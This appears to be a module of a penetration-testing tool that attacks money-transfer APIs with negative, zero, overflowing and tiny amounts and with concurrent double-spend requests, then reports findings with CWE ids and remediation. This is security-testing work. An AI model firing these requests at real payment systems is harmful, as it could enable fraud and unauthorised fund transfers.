    def _transfer(self, url: str, payload: dict, auth: str, content_type: str) -> tuple:
        import urllib.request, urllib.error, json, urllib.parse
        headers = {
            "Content-Type": content_type,
            "Authorization": auth,
            "User-Agent": "PenTools/1.0",
        }
        if "json" in content_type:
            body = json.dumps(payload).encode()
        else:
            body = urllib.parse.urlencode(payload).encode()
        req = urllib.request.Request(url, data=body, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=12) as r:
                return r.status, r.read(8192).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(4096).decode("utf-8", errors="replace")
        except Exception as ex:
            return 0, str(ex)

    def _get_balance(self, balance_url: str, auth: str) -> str:
        import urllib.request, urllib.error
        if not balance_url:
            return ""
        req = urllib.request.Request(balance_url, headers={
            "Authorization": auth, "User-Agent": "PenTools/1.0"})
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.read(4096).decode("utf-8", errors="replace")
        except Exception:
            return ""

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import threading, time

        url = params["transfer_url"].strip()
        balance_url = params.get("balance_url", "").strip()
        auth = params.get("auth_header", "").strip()
        attacks = params.get("attacks", ["negative_amount", "race_condition"])
        amount_field = params.get("amount_field", "amount")
        from_field = params.get("from_field", "from_account")
        to_field = params.get("to_field", "to_account")
        from_acc = params.get("from_account", "1001")
        to_acc = params.get("to_account", "1002")
        race_threads = int(params.get("race_threads", 10))
        content_type = params.get("content_type", "application/json")

        findings = []
        raw_lines = [f"Target: {url}", f"Attacks: {attacks}"]

        base_payload = {from_field: from_acc, to_field: to_acc}

        # Baseline balance
        balance_before = self._get_balance(balance_url, auth)

        # ── Negative amount ──
        if "negative_amount" in attacks:
            stream("info", "Testing negative amount transfer...")
            code, body = self._transfer(url, {**base_payload, amount_field: -100}, auth, content_type)
            raw_lines.append(f"[negative_amount] HTTP {code}: {body[:80]}")
            success_indicators = ["success", "true", "transferred", "200", "completed", "ok"]
            if code in (200, 201) and any(ind in body.lower() for ind in success_indicators):
                stream("success", "Negative amount transfer ACCEPTED!")
                balance_after = self._get_balance(balance_url, auth)
                findings.append({
                    "title": "Business Logic: Negative amount transfer accepted",
                    "severity": "critical",
                    "url": url,
                    "description": (
                        "The application accepted a transfer with amount=-100. "
                        "This may allow an attacker to reverse fund flow and increase their own balance."
                    ),
                    "evidence": f"Payload amount=-100\nHTTP {code}: {body[:400]}"
                                + (f"\nBalance before: {balance_before[:200]}\nBalance after: {balance_after[:200]}" if balance_after else ""),
                    "remediation": (
                        "Validate that all monetary amounts are strictly positive (> 0). "
                        "Use absolute value validation on server side, never trust client-side filtering."
                    ),
                    "cvss_score": 9.1, "cwe_id": "CWE-840",
                })

        # ── Zero amount ──
        if "zero_amount" in attacks:
            stream("info", "Testing zero-value transfer...")
            code, body = self._transfer(url, {**base_payload, amount_field: 0}, auth, content_type)
            raw_lines.append(f"[zero_amount] HTTP {code}: {body[:60]}")
            if code in (200, 201):
                findings.append({
                    "title": "Business Logic: Zero-amount transfer accepted",
                    "severity": "medium",
                    "url": url,
                    "description": "Zero-value transfer was accepted. May indicate insufficient input validation.",
                    "evidence": f"HTTP {code}: {body[:300]}",
                    "remediation": "Reject transfers with amount <= 0. Validate minimum transaction thresholds.",
                    "cwe_id": "CWE-20",
                })

        # ── Integer overflow ──
        if "integer_overflow" in attacks:
            overflow_vals = [2**31 - 1, 2**63 - 1, 2**31, 9999999999999]
            for val in overflow_vals[:2]:
                stream("info", f"Testing integer overflow: {val}")
                code, body = self._transfer(url, {**base_payload, amount_field: val}, auth, content_type)
                raw_lines.append(f"[overflow {val}] HTTP {code}: {body[:60]}")
                if code in (200, 201):
                    findings.append({
                        "title": f"Business Logic: Large integer transfer accepted ({val})",
                        "severity": "high",
                        "url": url,
                        "description": f"Transfer with amount={val} (potential overflow value) was accepted.",
                        "evidence": f"HTTP {code}: {body[:300]}",
                        "remediation": "Apply server-side maximum transaction limits. Use decimal types for currency, not int/float.",
                        "cwe_id": "CWE-190",
                    })
                    break

        # ── Float epsilon ──
        if "float_epsilon" in attacks:
            stream("info", "Testing float epsilon transfer (0.000001)...")
            code, body = self._transfer(url, {**base_payload, amount_field: 0.000001}, auth, content_type)
            raw_lines.append(f"[float_epsilon] HTTP {code}: {body[:60]}")
            if code in (200, 201):
                findings.append({
                    "title": "Business Logic: Sub-unit float transfer accepted",
                    "severity": "medium",
                    "url": url,
                    "description": "Transfer with amount=0.000001 was accepted. May enable salami/micropayment abuse.",
                    "evidence": f"HTTP {code}: {body[:300]}",
                    "remediation": "Enforce minimum transaction amounts. Round to currency precision (2 decimal places).",
                    "cwe_id": "CWE-682",
                })

        # ── Race condition (double-spend) ──
        if "race_condition" in attacks:
            stream("info", f"Testing race condition with {race_threads} concurrent transfers...")
            results = []
            errors = []

            def do_transfer():
                try:
                    c, b = self._transfer(url, {**base_payload, amount_field: 1}, auth, content_type)
                    results.append((c, b))
                except Exception as e:
                    errors.append(str(e))

            threads = [threading.Thread(target=do_transfer) for _ in range(race_threads)]
            t_start = time.time()
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=20)
            elapsed = time.time() - t_start

            success_codes = sum(1 for c, b in results if c in (200, 201))
            raw_lines.append(f"[race] {success_codes}/{race_threads} accepted in {elapsed:.2f}s")
            stream("info", f"Race result: {success_codes}/{race_threads} accepted")

            balance_after = self._get_balance(balance_url, auth)

            if success_codes > 1:
                stream("success", f"Race condition! {success_codes} concurrent transfers accepted!")
                findings.append({
                    "title": f"Business Logic: Race condition — {success_codes}/{race_threads} concurrent transfers accepted",
                    "severity": "critical",
                    "url": url,
                    "description": (
                        f"{success_codes} out of {race_threads} simultaneous transfer requests were accepted. "
                        "This indicates a TOCTOU race condition allowing double-spend or balance overflow."
                    ),
                    "evidence": (
                        f"{success_codes}/{race_threads} accepted in {elapsed:.2f}s\n"
                        + (f"Balance after: {balance_after[:200]}" if balance_after else "")
                    ),
                    "remediation": (
                        "Use database-level row locking (SELECT FOR UPDATE) or atomic transactions. "
                        "Implement idempotency keys per request. "
                        "Use distributed locking (Redis SETNX) for concurrent transfer protection."
                    ),
                    "cvss_score": 9.1, "cwe_id": "CWE-362",
                })

        if not findings:
            findings.append({
                "title": "Account/balance exploit — no vulnerabilities detected",
                "severity": "info", "url": url,
                "description": "All tested transfer attacks were rejected by the application.",
                "evidence": "\n".join(raw_lines[-10:]),
                "remediation": "Maintain strict amount validation and atomic transactions.",
            })

        stream("success", f"Balance exploit test complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}
